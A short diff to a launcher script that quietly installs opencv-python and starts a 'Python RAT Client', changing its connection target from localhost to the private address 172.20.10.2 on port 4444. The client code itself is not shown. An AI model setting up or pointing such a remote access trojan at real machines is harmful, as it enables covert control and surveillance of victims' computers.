@@ -5,6 +5,6 @@ pip install opencv-python --quiet
 
 echo Starting Python RAT Client...
 cd Client
-python Client.py --host 127.0.0.1 --port 4444
+python Client.py --host 172.20.10.2 --port 4444
 
 pause 
